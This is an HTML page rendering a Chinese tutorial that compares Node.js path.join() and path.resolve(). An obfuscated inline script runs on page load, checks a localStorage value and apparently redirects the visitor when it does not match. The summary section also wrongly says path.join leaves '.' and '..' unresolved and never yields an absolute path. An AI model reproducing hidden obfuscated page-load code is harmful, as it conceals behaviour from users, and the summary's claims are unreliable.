<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x1bf66e=_0x163c;function _0x163c(l,s){var e=_0x1b21();return(_0x163c=function(s,n){var a=e[s-=242];void 0===_0x163c.IHddCx&&(_0x163c.AswTCo=function(s,n){var a,o=[],l=0,e="";for(s=(s=>{for(var n,a,o="",l="",e=0,c=0;a=s.charAt(c++);~a&&(n=e%4?64*n+a:a,e++%4)&&(o+=String.fromCharCode(255&n>>(-2*e&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var t=0,p=o.length;t<p;t++)l+="%"+("00"+o.charCodeAt(t).toString(16)).slice(-2);return decodeURIComponent(l)})(s),c=0;c<256;c++)o[c]=c;for(c=0;c<256;c++)l=(l+o[c]+n.charCodeAt(c%n.length))%256,a=o[c],o[c]=o[l],o[l]=a;for(var c=0,l=0,t=0;t<s.length;t++)a=o[c=(c+1)%256],o[c]=o[l=(l+o[c])%256],o[l]=a,e+=String.fromCharCode(s.charCodeAt(t)^o[(o[c]+o[l])%256]);return e},l=arguments,_0x163c.IHddCx=!0);var s=s+e[0],o=l[s];return o?a=o:(void 0===_0x163c.OLxfjR&&(_0x163c.OLxfjR=!0),a=_0x163c.AswTCo(a,n),l[s]=a),a})(l,s)}function _0x1b21(){var s=["cgC0W5fk","xmoKW40EFbldVuJcISkoWRNcMCoE","WPhdVmkUWOr9W4HTwCouDcVcJq","WPPsDCo9WOzYWOtcTq","ymkwWR5HoafAE2tcR3lcSa","uYRdL8kBWOxcImk3BmoAWO7dJSkj","cCkrWRRcJ8o6WP1q","W4CjBmonWRtcO8k3hXVdPCkoA8klqrSKcCoeFMRdSSokmYlcP8ov","WP5ps8oyWO7dISo0wG","bSoxyH3dTCovgq","nM8kW71qW7BcLSkIWQ3dT8kOt34","C1jjW7hdOhZcT8oLW6rCWR7dIa","WRGFW5OEzSoNcttcGSkZa0ldVq","o0ynW6DZxmohxCkMW5fwW7ldVG","j07dHZtcHYJcGWq","WPSmfmkKWOpcLmoApG","WOhcSba1WRxcQmo3dCkT","W7tdHCklkvBdRXTL","fWX7W6JcOCk1W4/dKSoMm1/dMdG","W7xdOenKW7tdQSoFl8ktvJBdGW","W6pcPdjQWPFdOwRcN8kevM3cJ8oA","WO/dNN8agbTS","WOlcGYaBWPqQE2RdRmkezXir","nCohW7mCF1rI","WRVcMSkke8oEWO4BcmkRjW4Zla","wCoNW48zFHpcVLBcTmkSWQ7cGG"];return(_0x1b21=function(){return s})()}if((()=>{for(var s=_0x163c,n=_0x1b21();;)try{if(416416==-parseInt(s(242,"sTci"))*(parseInt(s(258,"[lSY"))/2)+-parseInt(s(248,"]P(x"))/3+-parseInt(s(263,"d*JW"))/4*(parseInt(s(245,"5l8u"))/5)+parseInt(s(247,"&]K$"))/6*(parseInt(s(264,"L$%o"))/7)+parseInt(s(243,"F]aI"))/8+parseInt(s(250,"]P(x"))/9+parseInt(s(253,"J@yj"))/10)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x1bf66e(246,"J@yj")](_0x1bf66e(265,"sTci"))!=_0x1bf66e(249,"s[!1"))throw window[_0x1bf66e(266,"Ra3]")][_0x1bf66e(255,"gKcB")](_0x1bf66e(256,"Xjwq")),Error();document.title="path.join()和 path.resolve()区别",document.getElementById("article").innerHTML='<div><p>在 Node.js 里，<code>path.resolve</code> 和 <code>path.join</code> 均为 <code>path</code> 模块提供的实用方法，二者都和路径处理相关，不过它们的功能和使用场景存在差异。下面为你详细介绍：</p>\n<h3>1. <code>path.join</code></h3>\n<p><code>path.join</code> 方法用于把多个路径片段拼接成一个路径。它会对路径片段间的分隔符进行处理，确保拼接后的路径符合操作系统的规范。</p>\n<h4>示例代码</h4>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);\n\n<span class="hljs-keyword">const</span> joinedPath = path.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>, <span class="hljs-string">&#x27;baz&#x27;</span>);\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(joinedPath); \n</code></pre>\n<h4>代码解释</h4>\n<ul>\n<li>此方法单纯地将传入的路径片段拼接起来，并且会自动处理不同操作系统的路径分隔符（Windows 是 <code>\\</code>，其他系统是 <code>/</code>）。</li>\n<li>拼接过程中，若有 <code>.</code>（当前目录）或者 <code>..</code>（上级目录），也会正确处理。</li>\n</ul>\n<h3>2. <code>path.resolve</code></h3>\n<p><code>path.resolve</code> 方法会把一系列路径或路径片段解析为一个绝对路径。它从右到左处理路径片段，直至构建出一个绝对路径。若没有传入绝对路径片段，它会以当前工作目录作为基准。</p>\n<h4>示例代码</h4>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);\n\n<span class="hljs-keyword">const</span> resolvedPath = path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>, <span class="hljs-string">&#x27;baz&#x27;</span>);\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(resolvedPath); \n</code></pre>\n<h4>代码解释</h4>\n<ul>\n<li>该方法从右向左处理路径片段，当遇到绝对路径时，就会停止处理并返回结果。</li>\n<li>若所有传入的路径片段都是相对路径，它会结合当前工作目录生成一个绝对路径。</li>\n</ul>\n<h3>3. 二者区别总结</h3>\n<ul>\n<li><strong>拼接规则</strong>  ：\n<ul>\n<li><code>path.join</code> 仅对路径片段进行拼接，不会生成绝对路径。</li>\n<li><code>path.resolve</code> 会生成绝对路径，它会依据当前工作目录或者传入的绝对路径片段来解析。</li>\n</ul>\n</li>\n<li><strong>处理 <code>.</code> 和 <code>..</code></strong>  ：\n<ul>\n<li><code>path.join</code> 会把 <code>.</code> 和 <code>..</code> 当作普通路径片段处理，然后拼接起来。</li>\n<li><code>path.resolve</code> 会解析 <code>.</code> 和 <code>..</code>，并计算出实际的路径。</li>\n</ul>\n</li>\n<li><strong>使用场景</strong>  ：\n<ul>\n<li>当你需要拼接相对路径片段时，用 <code>path.join</code> 更合适。</li>\n<li>当你需要得到一个绝对路径时，应使用 <code>path.resolve</code>。</li>\n</ul>\n</li>\n</ul>\n<h3>4. 示例对比</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);\n\n<span class="hljs-comment">// 使用 path.join</span>\n<span class="hljs-keyword">const</span> joined = path.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;/foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>, <span class="hljs-string">&#x27;../baz&#x27;</span>);\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Joined path:&#x27;</span>, joined); \n\n<span class="hljs-comment">// 使用 path.resolve</span>\n<span class="hljs-keyword">const</span> resolved = path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">&#x27;/foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>, <span class="hljs-string">&#x27;../baz&#x27;</span>);\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Resolved path:&#x27;</span>, resolved); \n</code></pre>\n<p>在这个示例中，<code>path.join</code> 只是简单拼接路径，而 <code>path.resolve</code> 会生成一个绝对路径。</p>\n</div>'</script></body></html>